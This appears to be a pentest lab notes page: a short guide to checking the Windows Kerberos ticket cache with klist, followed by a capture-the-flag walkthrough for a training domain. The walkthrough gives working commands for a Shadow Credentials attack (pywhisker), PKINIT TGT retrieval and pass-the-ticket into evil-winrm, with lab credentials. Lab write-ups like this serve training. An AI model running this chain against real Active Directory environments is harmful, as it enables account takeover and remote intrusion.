## Current operation: Inspect the current Windows ticket cache

**Run in:** Windows cmd.exe. **Requires:** A Windows session in the identity/logon context being tested; this is Windows klist, not MIT klist.

```console
klist
```

**Read the result:** Record principal, realm, service names, ticket times and cache/logon-session identity.

**If The expected ticket is absent from this session:** Windows and MIT Kerberos klist are different programs; a ticket visible in one cache is not necessarily used by another client or process.

**Next check:** Check the actual client identity, service SPN and ticket lifetime; compare another logon session only when you have the required access.

**Scope of these examples:** The operations above provide the current starting checks. The complete earlier guide, variants and lab transcripts remain below; they retain their original assumptions.

### Flag 1 — Shadow Credentials → jpinkman

**Pass the Certificate: PKINIT and Lab Walkthrough**

```bash
# 1. write our key into jpinkman's msDS-KeyCredentialLink → get a PFX + its password
pywhisker --dc-ip 10.129.234.174 -d INLANEFREIGHT.LOCAL -u wwhite -p 'package5shores_topher1' \
  --target jpinkman --action add
#   -> Saved PFX ... eFUVVTPf.pfx   |   Password: bmRH4LK7UwPrAOfvIx6W

# 2. PFX -> TGT as jpinkman
python3 gettgtpkinit.py -cert-pfx eFUVVTPf.pfx -pfx-pass 'bmRH4LK7UwPrAOfvIx6W' \
  -dc-ip 10.129.234.174 INLANEFREIGHT.LOCAL/jpinkman /tmp/jpinkman.ccache

# 3. Pass-the-Ticket -> WinRM in AS jpinkman (Kerberos)
export KRB5CCNAME=/tmp/jpinkman.ccache
klist                                   # Default principal: jpinkman@INLANEFREIGHT.LOCAL
evil-winrm -i dc01.inlanefreight.local -r inlanefreight.local
```
